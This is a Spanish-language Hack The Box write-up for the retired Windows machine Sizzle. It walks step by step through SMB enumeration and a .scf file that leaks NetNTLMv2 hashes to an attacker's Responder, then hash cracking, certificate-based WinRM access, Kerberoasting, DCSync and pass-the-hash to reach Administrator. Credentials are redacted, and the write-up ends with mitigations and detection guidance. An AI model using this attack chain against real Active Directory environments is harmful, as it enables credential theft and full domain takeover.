---
machine: Sizzle
os: Windows
difficulty: Insane
platform: Hack The Box
category: Windows / Active Directory / ADCS
state: Retired
tags: [windows, active-directory, smb, scf, responder, adcs, kerberoasting, dcsync]
---

# Sizzle — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired según HTB y writeups públicos; no comprobado con sesión en HTB.
> Ficha de método: sin flags, hashes ni credenciales reales.

## TL;DR

DC `sizzle.htb.local` del dominio `HTB.LOCAL`. Un directorio escribible en el share `Department Shares` permite dejar un `.scf` que fuerza al servidor a autenticarse contra un Responder; el NetNTLMv2 de `amanda` cae con `rockyou`. El puerto 88 está filtrado desde fuera y el WinRM por contraseña falla, así que el acceso se hace con un certificado de usuario emitido por `/certsrv` sobre WinRM 5986. Ya dentro, `mrlky` tiene un SPN y derechos de replicación: Kerberoasting, crackeo, `DCSync` y pass-the-hash hasta Administrator.

## Reconocimiento

```bash
nmap -p- -T4 -Pn -oA nmap_all <IP>
nmap -p21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -sCV -Pn -oA nmap_svc <IP>
```

```text
21/tcp    ftp           Microsoft ftpd (anónimo)
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0
135/tcp   msrpc
139/tcp   netbios-ssn
443/tcp   ssl/http      Microsoft IIS 10.0
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
3269/tcp  ssl/ldap
5985/tcp  wsman
5986/tcp  wsmans
9389/tcp  adws
47001/tcp winrm
```

- El host es `SIZZLE`, FQDN `sizzle.htb.local`, dominio `HTB.LOCAL`.
- **El 88 no está accesible desde la VPN**: por eso Kerberoasting se hace con Rubeus usando credenciales de red, o después de tunelizar 88/389.
- `/certsrv` responde 401 con autenticación NTLM y `/certenroll` está publicado: hay ADCS.
- El share `Department Shares` es legible y `Users/Public` es escribible.

```bash
printf '%s\n' '<IP> sizzle.htb.local HTB.LOCAL SIZZLE' | sudo tee -a /etc/hosts
```

## Enumeración

```bash
ftp -n <IP>
# usuario anonymous, contraseña vacía
netexec smb sizzle.htb.local -u guest -p '' --shares
smbclient -N //sizzle.htb.local/'Department Shares'
```

FTP anónimo está vacío y no aporta nada. SMB sí: `Department Shares` se puede listar y el directorio `Users/Public` acepta escritura para invitado. Esa combinación es el foothold.

La web confirma la CA y el portal de inscripción:

```bash
curl -I http://sizzle.htb.local/certsrv/
curl -s http://sizzle.htb.local/certenroll/ | head
```

## Foothold

### `.scf` + Responder

Se crea un fichero `.scf` que apunta a un recurso UNC del atacante:

```ini
[Shell]
Command=2
IconFile=\\192.0.2.10\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

Se sube al directorio escribible:

```bash
smbclient -N //sizzle.htb.local/'Department Shares' \
  -D 'Users/Public' -c 'put icon.scf'
```

Con Responder escuchando SMB:

```bash
sudo responder -I tun0
```

Cuando el servidor (o un usuario) abre el directorio, Windows intenta resolver el icono y envía el hash NetNTLMv2 de `HTB\amanda`. Se guarda y se crackea:

```bash
hashcat -m 5600 amanda.netntlmv2 /usr/share/wordlists/rockyou.txt
# john amanda.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado: `amanda:<PASS_AMANDA>`.

### Certificado para WinRM

El login por contraseña en WinRM falla con un error de cabecera de autorización; el camino que documentan los writeups es un certificado de usuario:

```bash
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

Se pega el CSR en `Request a certificate → advanced certificate request` de `/certsrv`, autenticando como `HTB\amanda`, y se descarga la respuesta en Base64 como `certnew.cer`.

```bash
evil-winrm -i sizzle.htb.local -k amanda.key -c certnew.cer -S
```

`-S` fuerza SSL y usa el 5986. La sesión queda en **Constrained Language Mode** y AppLocker bloquea rutas de usuario; para ejecutar herramientas hay que usar una ruta permitida (`C:\Windows\Temp`) o un bypass de PowerShell v2/InstallUtil.

La flag de usuario no está en el perfil de `amanda`: está en el escritorio de `mrlky`. Hay que moverse.

## Escalada de privilegios

### Kerberoasting de mrlky

`mrlky` tiene el SPN `http/sizzle` y los derechos `DS-Replication-Get-Changes` y `-All` (DCSync). Como el 88 está filtrado, Rubeus puede pedir el ticket con las credenciales de red de Amanda:

```powershell
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:<PASS_AMANDA> /domain:htb.local
```

Alternativa con túnel a 88/389:

```bash
GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda
hashcat -m 13100 mrlky.spn /usr/share/wordlists/rockyou.txt
```

Resultado: `mrlky:<PASS_MRLKY>`.

### DCSync y pass-the-hash

```bash
secretsdump.py -just-dc-ntlm htb.local/mrlky:'<PASS_MRLKY>'@sizzle.htb.local
```

La salida incluye el hash NT de Administrator (`<ADMIN_NT_HASH>`); no se publica. Con pass-the-hash:

```bash
psexec.py -hashes :<ADMIN_NT_HASH> htb.local/Administrator@sizzle.htb.local
```

```text
nt authority\system
```

También funciona `wmiexec.py` o `crackmapexec smb ... -H <ADMIN_NT_HASH> -x ...`. La flag de root está en el escritorio de Administrator.

## Evidencia

- `nmap` con 5986/9389 y sin 88 accesible.
- `netexec smb ... --shares` con `Department Shares` y `Users/Public` escribible.
- `icon.scf` y captura de Responder con `HTB\amanda`, contraseña redactada.
- CSR, certificado Base64 y `evil-winrm -S` funcionando.
- `Rubeus kerberoast` o `GetUserSPNs.py` con el SPN de `mrlky`.
- `secretsdump -just-dc-ntlm` y `psexec -hashes`, sin hashes reales.

## Lecciones aprendidas

- Un `.scf` no ejecuta código: **fuerza una autenticación** a un UNC. La primitiva es el hash, no el fichero.
- El puerto 88 filtrado no impide Kerberoasting: Rubeus puede usar un logon de red; también se puede tunelizar.
- Un certificado de usuario sirve para WinRM cuando la contraseña no pasa la autenticación, aunque no haya una plantilla ESC1 vulnerable.
- CLM y AppLocker no son el final: obligan a cambiar de ruta y de técnica, no a renunciar.
- `mrlky` no era administrador, pero tenía derechos de replicación: DCSync convierte un usuario con SPN en Domain Admin.

## Mitigaciones y detección

- Quitar escritura a invitados en shares; revisar `Department Shares` y `Users/Public`; bloquear `.scf`/`.lnk` en rutas compartidas.
- Deshabilitar NTLM donde sea posible y exigir SMB signing; monitorizar conexiones SMB salientes a hosts no inventariados.
- Revisar la CA: plantillas, inscripción y autenticación por certificado; no permitir certificados de usuario para cuentas que no los necesiten.
- Rotar la contraseña de `amanda`, limitar `mrlky` y retirar `DS-Replication-Get-Changes` a cuentas que no sean DC.
- Detección: 5140/5145 sobre `Department Shares`; autenticaciones NTLM a IPs externas; 4769 con RC4 y SPN de usuario; 4662 con `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`; 4624 tipo 3 desde hosts no habituales.
- MITRE: T1187, T1558.003, T1003.006, T1021.006, T1550.002.

## Referencias

- <https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html>
- <https://axcheron.github.io/writeups/htb/sizzle>
- <https://omnisl4sh.github.io/2022/05/02/Sizzle.html>
- <https://www.hackthebox.com/machines/sizzle>
